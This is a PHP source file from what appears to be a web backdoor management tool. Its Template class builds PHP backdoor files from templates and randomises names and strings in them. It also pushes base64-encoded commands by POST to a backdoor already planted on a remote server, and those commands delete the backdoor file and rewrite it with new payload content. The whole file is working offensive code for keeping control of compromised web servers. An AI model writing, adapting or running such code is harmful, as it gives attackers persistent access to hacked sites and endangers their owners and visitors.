<?php

namespace System\Templates;

use Database\Database;
use System\Configuration;
use Classes\GlobalAction;
use \PDO;

class Template
{
    public static function generateTemplate($templateName)
    {
        $configuration = Configuration::getConfigElement();
        $payloads = $configuration->templates->backdoor;
        if(count($payloads) > 0)
        {
            foreach ($payloads as $payload)
            {
                if($payload->name == $templateName)
                {
                    if(file_exists(__DIR__.'/../../../Template/'.$payload->filename))
                    {
                        $content = file_get_contents(__DIR__.'/../../../Template/'.$payload->filename);
                        $string = "azertyuiopsdfghjklmwxcvbnAZERTYUIOPQSDFGHJKLMWXCVBN";
                        $shuffle = str_shuffle($string);
                        $rand_5 = substr($shuffle,0,5);
                        $content = str_replace("{{STRING_RANDOM}}", $rand_5, $content);
                        $content = str_replace("{{STRING_RANDOM_2}}", substr($shuffle,5,5), $content);
                        $content = str_replace("{{FIRST_L}}", substr($shuffle,6,1),$content);
                        $content = str_replace("{{SECOND_L}}", substr($shuffle,7,1), $content);
                        $content = str_replace("{{T_L}}", substr($shuffle, 8, 1), $content);
                        $content = str_replace("{{F_L}}", substr($shuffle, 9,1), $content);
                        $content = str_replace("{{FV_L}}", substr($shuffle,10,1),$content);
                        $content = str_replace("{{S_L}}", substr($shuffle,11,1), $content);
                        $file = fopen(__DIR__.'/../../../../Output/'.substr($shuffle,0,4).'.php', 'a+');
                        fwrite($file, $content);
                        fclose($file);
                        return substr($shuffle,0,4).'.php';
                    }
                    return false;
                }
            }
        }
        return false;
    }

    public static function generatePayloadTemplate($templateName)
    {
        $configuration = Configuration::getConfigElement();
        $payloads = $configuration->templates->backdoor;
        if(count($payloads) > 0)
        {
            foreach ($payloads as $payload)
            {
                if($payload->name == $templateName)
                {
                    if(file_exists(__DIR__.'/../../../Template/'.$payload->filename))
                    {
                        $content = file_get_contents(__DIR__.'/../../../Template/'.$payload->filename);
                        $string = "azertyuiopsdfghjklmwxcvbnAZERTYUIOPQSDFGHJKLMWXCVBN";
                        $shuffle = str_shuffle($string);
                        $rand_5 = substr($shuffle,0,5);
                        $content = str_replace("{{STRING_RANDOM}}", $rand_5, $content);
                        $content = str_replace("{{STRING_RANDOM_2}}", substr($shuffle,5,5), $content);
                        $content = str_replace("{{FIRST_L}}", substr($shuffle,6,1),$content);
                        $content = str_replace("{{SECOND_L}}", substr($shuffle,7,1), $content);
                        $content = str_replace("{{T_L}}", substr($shuffle, 8, 1), $content);
                        $content = str_replace("{{F_L}}", substr($shuffle, 9,1), $content);
                        $content = str_replace("{{FV_L}}", substr($shuffle,10,1),$content);
                        $content = str_replace("{{S_L}}", substr($shuffle,11,1), $content);
                        $currentBackdoor = Database::getCurrentBackdoorInformation(Database::backdoor_selected());
                        if($currentBackdoor)
                        {
                            $payload ='@unlink("'.end(explode("/", $currentBackdoor->backdoor_url)).'");
                            @fwrite(fopen("'.end(explode("/", $currentBackdoor->backdoor_url)).'", "a+"),base64_decode("'.base64_encode($content).'"));';

                            GlobalAction::sendPost($currentBackdoor->backdoor_url, ['c' => base64_encode($payload)]);
                            return true;
                        }
                        return false;
                    }
                    return false;
                }
            }
        }
        return false;
    }

    public static function listTemplatePayload()
    {
        $configuration = Configuration::getConfigElement();
        $payloads = $configuration->templates->backdoor;
        if(count($payloads) > 0)
        {
            return $payloads;
        }
        return false;
    }
}